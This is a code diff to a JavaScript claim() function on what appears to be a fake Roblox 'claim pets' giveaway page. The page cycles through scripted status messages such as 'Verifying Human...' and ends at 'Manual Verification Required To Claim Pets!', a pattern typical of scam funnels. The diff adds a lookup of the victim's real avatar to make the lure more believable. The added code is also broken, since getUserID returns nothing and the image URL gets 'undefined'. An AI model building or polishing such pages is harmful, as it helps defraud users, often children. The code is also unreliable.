@@ -154,7 +154,22 @@ function claim() {
     $('.status').fadeIn()
 
     const statuses = ['Connecting...', 'Authorizing User...', 'User Found!', 'Verifying Human...', 'Attempting Human Verification...', 'Manual Verification Required To Claim Pets!'];
-    const ch="http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" + document.querySelector(".champ").value;
+    // 
+    function getUserID(name)
+    {
+        fetch(`https://www.roblox.com/users/profile?username=${name}`)
+            .then(r => {
+                if (!r.ok) { throw "Invalid response"; }
+                return r.url.match(/\d+/)[0];
+            })
+            .then(id => {
+                console.log(id);
+            })
+    }
+    // 
+    
+    const pp=getUserID(document.querySelector(".champ").value);
+    const ch="https://www.roblox.com/headshot-thumbnail/image?userId="+pp+"&width=420&height=420&format=png";
     document.getElementById("prpc").src=ch;
     document.getElementById("prpc").style.display = "inline-block";
     for (let i = 0; i < statuses.length; i++) {
